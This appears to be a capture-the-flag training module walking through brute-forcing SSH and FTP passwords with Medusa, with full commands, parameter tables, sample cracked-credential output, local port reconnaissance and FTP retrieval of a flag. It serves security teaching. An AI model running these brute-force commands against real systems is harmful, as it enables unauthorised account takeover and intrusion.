# Web Services

In the dynamic landscape of cybersecurity, maintaining robust authentication mechanisms is paramount. While technologies like Secure Shell (SSH) and File Transfer Protocol (FTP) facilitate secure remote access and file management, they are often reliant on traditional username-password combinations, presenting potential vulnerabilities exploitable through brute-force attacks. In this module, we will delve into the practical application of Medusa, a potent brute-forcing tool, to systematically compromise both SSH and FTP services, thereby illustrating potential attack vectors and emphasizing the importance of fortified authentication practices.

## SSH Overview

SSH is a cryptographic network protocol that provides a secure channel for remote login, command execution, and file transfers over an unsecured network. Its strength lies in its encryption, which makes it significantly more secure than unencrypted protocols like Telnet. However, weak or easily guessable passwords can undermine SSH's security, exposing it to brute-force attacks.

## FTP Overview

FTP is a standard network protocol for transferring files between a client and a server on a computer network. It's also widely used for uploading and downloading files from websites. However, standard FTP transmits data, including login credentials, in cleartext, rendering it susceptible to interception and brute-forcing.

## Brute-Forcing SSH

### Initial Reconnaissance

Start the target system via the question section at the bottom of the page.

Target an SSH server running on a remote system. Assuming prior knowledge of the username `sshuser`, we can leverage Medusa to attempt different password combinations:

```bash
medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

**Parameter Breakdown:**

| Parameter | Description |
|-----------|-------------|
| `-h <IP>` | Target system's IP address |
| `-n <PORT>` | SSH service port (typically 22) |
| `-u sshuser` | Username for brute-force |
| `-P 2023-200_most_used_passwords.txt` | Wordlist with 200 most common passwords |
| `-M ssh` | SSH module selection |
| `-t 3` | Number of parallel login attempts |

### Execution & Results

```bash
medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

**Output:**
```
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks
...
ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]
```

### Gaining Access

Establish an SSH connection with the discovered password:

```bash
ssh sshuser@<IP> -p PORT
```

## Expanding the Attack Surface

### Discovering Internal Services

Once inside the system, identify other potential attack surfaces:

```bash
netstat -tulpn | grep LISTEN
```

**Output:**
```
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
tcp6       0      0 :::21                   :::*                    LISTEN
```

Confirm FTP service with nmap:

```bash
nmap localhost
```

**Output:**
```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

## Brute-Forcing FTP

### Targeting the FTP Server

Exploring `/home` reveals an `ftpuser` folder, suggesting the FTP username. Modify the Medusa command accordingly:

```bash
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

**Output:**
```
GENERAL: Parallel Hosts: 1 Parallel Logins: 5
...
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: ... [SUCCESS]
```

**Key differences:**
- `-h 127.0.0.1`: Local system targeting
- `-u ftpuser`: FTP username
- `-M ftp`: FTP module selection
- `-t 5`: Increased parallel attempts

### Retrieving the Flag

Connect via FTP and download the flag:

```bash
ftp ftp://ftpuser:<PASSWORD>@localhost
```

**FTP Commands:**
```
ftp> ls
-rw-------    1 1001     1001           35 Sep 05 13:17 flag.txt

ftp> get flag.txt
ftp> exit
```

**Read the flag:**
```bash
cat flag.txt
HTB{...}
```

## Conclusion

The ease with which such attacks can be executed underscores the importance of employing strong, unique passwords.
